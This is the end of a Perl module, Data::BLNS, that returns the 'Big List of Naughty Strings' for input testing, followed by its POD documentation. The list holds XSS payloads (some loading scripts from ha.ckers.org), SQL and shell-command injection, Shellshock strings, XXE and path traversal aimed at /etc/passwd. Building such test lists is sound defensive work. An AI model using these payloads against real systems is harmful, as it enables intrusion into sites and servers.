  "\x{24AF}\x{24A3}\x{24A0} \x{24AC}\x{24B0}\x{24A4}\x{249E}\x{24A6} \x{249D}\x{24AD}\x{24AA}\x{24B2}\x{24A9} \x{24A1}\x{24AA}\x{24B3} \x{24A5}\x{24B0}\x{24A8}\x{24AB}\x{24AE} \x{24AA}\x{24B1}\x{24A0}\x{24AD} \x{24AF}\x{24A3}\x{24A0} \x{24A7}\x{249C}\x{24B5}\x{24B4} \x{249F}\x{24AA}\x{24A2}",
  "<script>alert(123)</script>",
  "&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;",
  "<img src=x onerror=alert(123) />",
  "<svg><script>123<1>alert(123)</script>",
  "\"><script>alert(123)</script>",
  "'><script>alert(123)</script>",
  "><script>alert(123)</script>",
  "</script><script>alert(123)</script>",
  "< / script >< script >alert(123)< / script >",
  " onfocus=JaVaSCript:alert(123) autofocus",
  "\" onfocus=JaVaSCript:alert(123) autofocus",
  "' onfocus=JaVaSCript:alert(123) autofocus",
  "\x{FF1C}script\x{FF1E}alert(123)\x{FF1C}/script\x{FF1E}",
  "<sc<script>ript>alert(123)</sc</script>ript>",
  "--><script>alert(123)</script>",
  "\";alert(123);t=\"",
  "';alert(123);t='",
  "JavaSCript:alert(123)",
  ";alert(123);",
  "src=JaVaSCript:prompt(132)",
  "\"><script>alert(123);</script x=\"",
  "'><script>alert(123);</script x='",
  "><script>alert(123);</script x=",
  "\" autofocus onkeyup=\"javascript:alert(123)",
  "' autofocus onkeyup='javascript:alert(123)",
  "<script\\x20type=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x3Etype=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x0Dtype=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x09type=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x0Ctype=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x2Ftype=\"text/javascript\">javascript:alert(1);</script>",
  "<script\\x0Atype=\"text/javascript\">javascript:alert(1);</script>",
  "'`\"><\\x3Cscript>javascript:alert(1)</script>",
  "'`\"><\\x00script>javascript:alert(1)</script>",
  "ABC<div style=\"x\\x3Aexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:expression\\x5C(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:expression\\x00(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:exp\\x00ression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:exp\\x5Cression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x0Aexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x09expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE3\\x80\\x80expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x84expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xC2\\xA0expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x80expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x0Dexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x0Cexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x87expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x20expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x88expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x00expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x86expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x85expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x82expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\x0Bexpression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x81expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x83expression(javascript:alert(1)\">DEF",
  "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",
  "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x0Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xC2\\xA0javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x05javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x18javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x11javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x88javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x89javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x00javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x10javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x82javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x20javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x13javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x09javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x8Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x14javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x19javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\xAFjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x81javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x87javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x07javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE1\\x9A\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x83javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x04javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x01javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x08javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x84javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x86javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE3\\x80\\x80javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x12javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x0Djavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x0Ajavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x0Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x15javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\xA8javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x16javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x02javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x06javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\xA9javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x80\\x85javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\xE2\\x81\\x9Fjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"\\x1Cjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"javascript\\x00:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"javascript\\x3A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"javascript\\x09:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"javascript\\x0D:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "<a href=\"javascript\\x0A:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",
  "`\"'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x22onerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x0Donerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x09onerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x0Conerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x00onerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x27onerror=javascript:alert(1)>",
  "`\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>",
  "\"`'><script>\\x3Bjavascript:alert(1)</script>",
  "\"`'><script>\\x0Djavascript:alert(1)</script>",
  "\"`'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x81javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x84javascript:alert(1)</script>",
  "\"`'><script>\\xE3\\x80\\x80javascript:alert(1)</script>",
  "\"`'><script>\\x09javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x89javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x85javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x88javascript:alert(1)</script>",
  "\"`'><script>\\x00javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>",
  "\"`'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>",
  "\"`'><script>\\x0Cjavascript:alert(1)</script>",
  "\"`'><script>\\x2Bjavascript:alert(1)</script>",
  "\"`'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>",
  "\"`'><script>-javascript:alert(1)</script>",
  "\"`'><script>\\x0Ajavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>",
  "\"`'><script>\\x7Ejavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x87javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>",
  "\"`'><script>\\xC2\\x85javascript:alert(1)</script>",
  "\"`'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x83javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>",
  "\"`'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x80javascript:alert(1)</script>",
  "\"`'><script>\\x21javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x82javascript:alert(1)</script>",
  "\"`'><script>\\xE2\\x80\\x86javascript:alert(1)</script>",
  "\"`'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>",
  "\"`'><script>\\x0Bjavascript:alert(1)</script>",
  "\"`'><script>\\x20javascript:alert(1)</script>",
  "\"`'><script>\\xC2\\xA0javascript:alert(1)</script>",
  "<img \\x00src=x onerror=\"alert(1)\">",
  "<img \\x47src=x onerror=\"javascript:alert(1)\">",
  "<img \\x11src=x onerror=\"javascript:alert(1)\">",
  "<img \\x12src=x onerror=\"javascript:alert(1)\">",
  "<img\\x47src=x onerror=\"javascript:alert(1)\">",
  "<img\\x10src=x onerror=\"javascript:alert(1)\">",
  "<img\\x13src=x onerror=\"javascript:alert(1)\">",
  "<img\\x32src=x onerror=\"javascript:alert(1)\">",
  "<img\\x47src=x onerror=\"javascript:alert(1)\">",
  "<img\\x11src=x onerror=\"javascript:alert(1)\">",
  "<img \\x47src=x onerror=\"javascript:alert(1)\">",
  "<img \\x34src=x onerror=\"javascript:alert(1)\">",
  "<img \\x39src=x onerror=\"javascript:alert(1)\">",
  "<img \\x00src=x onerror=\"javascript:alert(1)\">",
  "<img src\\x09=x onerror=\"javascript:alert(1)\">",
  "<img src\\x10=x onerror=\"javascript:alert(1)\">",
  "<img src\\x13=x onerror=\"javascript:alert(1)\">",
  "<img src\\x32=x onerror=\"javascript:alert(1)\">",
  "<img src\\x12=x onerror=\"javascript:alert(1)\">",
  "<img src\\x11=x onerror=\"javascript:alert(1)\">",
  "<img src\\x00=x onerror=\"javascript:alert(1)\">",
  "<img src\\x47=x onerror=\"javascript:alert(1)\">",
  "<img src=x\\x09onerror=\"javascript:alert(1)\">",
  "<img src=x\\x10onerror=\"javascript:alert(1)\">",
  "<img src=x\\x11onerror=\"javascript:alert(1)\">",
  "<img src=x\\x12onerror=\"javascript:alert(1)\">",
  "<img src=x\\x13onerror=\"javascript:alert(1)\">",
  "<img[a][b][c]src[d]=x[e]onerror=[f]\"alert(1)\">",
  "<img src=x onerror=\\x09\"javascript:alert(1)\">",
  "<img src=x onerror=\\x10\"javascript:alert(1)\">",
  "<img src=x onerror=\\x11\"javascript:alert(1)\">",
  "<img src=x onerror=\\x12\"javascript:alert(1)\">",
  "<img src=x onerror=\\x32\"javascript:alert(1)\">",
  "<img src=x onerror=\\x00\"javascript:alert(1)\">",
  "<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>",
  "<img src=\"x` `<script>javascript:alert(1)</script>\"` `>",
  "<img src onerror /\" '\"= alt=javascript:alert(1)//\">",
  "<title onpropertychange=javascript:alert(1)></title><title title=>",
  "<a href=http://foo.bar/#x=`y></a><img alt=\"`><img src=x:x onerror=javascript:alert(1)></a>\">",
  "<!--[if]><script>javascript:alert(1)</script -->",
  "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",
  "<script src=\"/\\%(jscript)s\"></script>",
  "<script src=\"\\\\%(jscript)s\"></script>",
  "<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">",
  "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",
  "<IMG SRC=# onmouseover=\"alert('xxs')\">",
  "<IMG SRC= onmouseover=\"alert('xxs')\">",
  "<IMG onmouseover=\"alert('xxs')\">",
  "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>",
  "<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>",
  "<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>",
  "<IMG SRC=\"jav   ascript:alert('XSS');\">",
  "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
  "<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">",
  "<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">",
  "perl -e 'print \"<IMG SRC=java\\0script:alert(\\\"XSS\\\")>\";' > out",
  "<IMG SRC=\" &#14;  javascript:alert('XSS');\">",
  "<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
  "<BODY onload!#\$%&()*~+-_.,:;?\@[/|\\]^`=alert(\"XSS\")>",
  "<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>",
  "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>",
  "<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >",
  "<SCRIPT SRC=//ha.ckers.org/.j>",
  "<IMG SRC=\"javascript:alert('XSS')\"",
  "<iframe src=http://ha.ckers.org/scriptlet.html <",
  "\\\";alert('XSS');//",
  "<u oncopy=alert()> Copy me</u>",
  "<i onwheel=alert(1)> Scroll over me </i>",
  "<plaintext>",
  "http://a/%%30%30",
  "</textarea><script>alert(123)</script>",
  "1;DROP TABLE users",
  "1'; DROP TABLE users-- 1",
  "' OR 1=1 -- 1",
  "' OR '1'='1",
  " ",
  "%",
  "_",
  "-",
  "--",
  "--version",
  "--help",
  "\$USER",
  "/dev/null; touch /tmp/blns.fail ; echo",
  "`touch /tmp/blns.fail`",
  "\$(touch /tmp/blns.fail)",
  "\@{[system \"touch /tmp/blns.fail\"]}",
  "eval(\"puts 'hello world'\")",
  "System(\"ls -al /\")",
  "`ls -al /`",
  "Kernel.exec(\"ls -al /\")",
  "Kernel.exit(1)",
  "%x('ls -al /')",
  "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
  "\$HOME",
  "\$ENV{'HOME'}",
  "%d",
  "%s",
  "{0}",
  "%*.*s",
  "File:///",
  "../../../../../../../../../../../etc/passwd%00",
  "../../../../../../../../../../../etc/hosts",
  "() { 0; }; touch /tmp/blns.shellshock1.fail;",
  "() { _; } >_[\$(\$())] { touch /tmp/blns.shellshock2.fail; }",
  "<<< %s(un='%s') = %u",
  "+++ATH0",
  "CON",
  "PRN",
  "AUX",
  "CLOCK\$",
  "NUL",
  "A:",
  "ZZ:",
  "COM1",
  "LPT1",
  "LPT2",
  "LPT3",
  "COM2",
  "COM3",
  "COM4",
  "DCC SEND STARTKEYLOGGER 0 0 0",
  "Scunthorpe General Hospital",
  "Penistone Community Church",
  "Lightwater Country Park",
  "Jimmy Clitheroe",
  "Horniman Museum",
  "shitake mushrooms",
  "RomansInSussex.co.uk",
  "http://www.cum.qc.ca/",
  "Craig Cockburn, Software Specialist",
  "Linda Callahan",
  "Dr. Herman I. Libshitz",
  "magna cum laude",
  "Super Bowl XXX",
  "medieval erection of parapets",
  "evaluate",
  "mocha",
  "expression",
  "Arsenal canal",
  "classic",
  "Tyson Gay",
  "Dick Van Dyke",
  "basement",
  "If you're reading this, you've been in a coma for almost 20 years now. We're trying a new technique. We don't know where this message will end up in your dream, but we hope it works. Please wake up, we miss you.",
  "Roses are \e[0;31mred\e[0m, violets are \e[0;34mblue. Hope you enjoy terminal hue",
  "But now...\e[20Cfor my greatest trick...\e[8m",
  "The quic\b\b\b\b\b\bk brown fo\a\a\a\a\a\a\a\a\a\a\ax... [Beeeep]",
  "Power\x{644}\x{64F}\x{644}\x{64F}\x{635}\x{651}\x{628}\x{64F}\x{644}\x{64F}\x{644}\x{635}\x{651}\x{628}\x{64F}\x{631}\x{631}\x{64B} \x{963} \x{963}h \x{963} \x{963}\x{5197}",
}


1; # Magic true value required at end of module
__END__

=head1 NAME

Data::BLNS - A Perl interface to the Big List of Naughty Strings


=head1 VERSION

This document describes Data::BLNS version 20182514.062550


=head1 SYNOPSIS

    use Data::BLNS;

    my @list = get_naughty_strings();

    for my $next_str ( @list ) {

        test_something_with( $next_str );
    }


=head1 DESCRIPTION

This module exports a single function: C<get_naughty_strings()>

A call to that function returns a list of approximately 500
strings that may cause problems when used as user input.
The list originates from
L<minimaxir's GitHub repository|https://github.com/minimaxir/big-list-of-naughty-strings>

This list may also be useful as a test dataset for subroutines
or modules that use or manipulate strings.


=head1 INTERFACE

=head2 C<get_naughty_strings()>

This subroutine takes no arguments and returns a list of the
naughty strings. In scalar or void contexts, it throws an
exception.


=head1 DIAGNOSTICS

=head2 C<Useless use of get_naughty_strings() in a non-list context>

The subroutine returns a list of strings. You called it in scalar or void
context, so it couldn't return that list. Put the call in a list context.


=head1 CONFIGURATION AND ENVIRONMENT

Data::BLNS requires no configuration files or environment variables.


=head1 DEPENDENCIES

None.


=head1 INCOMPATIBILITIES

None reported.


=head1 BUGS AND LIMITATIONS

No bugs have been reported.

Please report any bugs or feature requests to
C<bug-data-blns@rt.cpan.org>, or through the web interface at
L<http://rt.cpan.org>.


=head1 AUTHOR

Damian Conway  C<< <DCONWAY@cpan.org> >>


=head1 LICENCE AND COPYRIGHT

Copyright (c) 2018, Damian Conway C<< <DCONWAY@cpan.org> >>. All rights reserved.

This module is free software; you can redistribute it and/or
modify it under the same terms as Perl itself. See L<perlartistic>.


=head1 DISCLAIMER OF WARRANTY

BECAUSE THIS SOFTWARE IS LICENSED FREE OF CHARGE, THERE IS NO WARRANTY
FOR THE SOFTWARE, TO THE EXTENT PERMITTED BY APPLICABLE LAW. EXCEPT WHEN
OTHERWISE STATED IN WRITING THE COPYRIGHT HOLDERS AND/OR OTHER PARTIES
PROVIDE THE SOFTWARE "AS IS" WITHOUT WARRANTY OF ANY KIND, EITHER
EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE.
ALL SUCH WARRANTIES ARE EXPLICITLY DISCLAIMED. THE ENTIRE RISK AS TO THE
QUALITY AND PERFORMANCE OF THE SOFTWARE IS WITH YOU. SHOULD THE SOFTWARE
PROVE DEFECTIVE, YOU ASSUME THE COST OF ALL NECESSARY SERVICING, REPAIR,
OR CORRECTION.

IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MAY MODIFY AND/OR
REDISTRIBUTE THE SOFTWARE AS PERMITTED BY THE ABOVE LICENCE, BE LIABLE
FOR DAMAGES, INCLUDING ANY DIRECT, INDIRECT, GENERAL, SPECIAL, INCIDENTAL,
EXEMPLARY, OR CONSEQUENTIAL DAMAGES, HOWEVER CAUSED AND ON ANY THEORY OF
LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
NEGLIGENCE OR OTHERWISE) ARISING OUT OF THE USE OR INABILITY TO USE THE
SOFTWARE (INCLUDING BUT NOT LIMITED TO PROCUREMENT OF SUBSTITUTE GOODS
OR SERVICES, LOSS OF DATA OR DATA BEING RENDERED INACCURATE, OR LOSSES
SUSTAINED BY YOU OR THIRD PARTIES, OR A FAILURE OF THE SOFTWARE TO
OPERATE WITH ANY OTHER SOFTWARE) EVEN IF SUCH HOLDER OR OTHER PARTY HAS
BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.


